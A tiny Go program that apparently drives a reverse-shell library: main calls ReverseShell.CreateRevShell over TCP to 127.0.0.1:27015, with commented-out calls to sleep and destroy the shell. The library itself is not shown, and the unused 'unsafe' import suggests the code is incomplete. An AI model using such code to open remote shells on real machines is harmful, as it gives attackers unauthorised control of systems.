package main

import(
  "ReverseShell"
  "unsafe"
)

func main(){
  ReverseShell.CreateRevShell("tcp", "127.0.0.1:27015")
  //time.Sleep(10 * time.Second)
  //ReverseShell.DestroyShell()
}
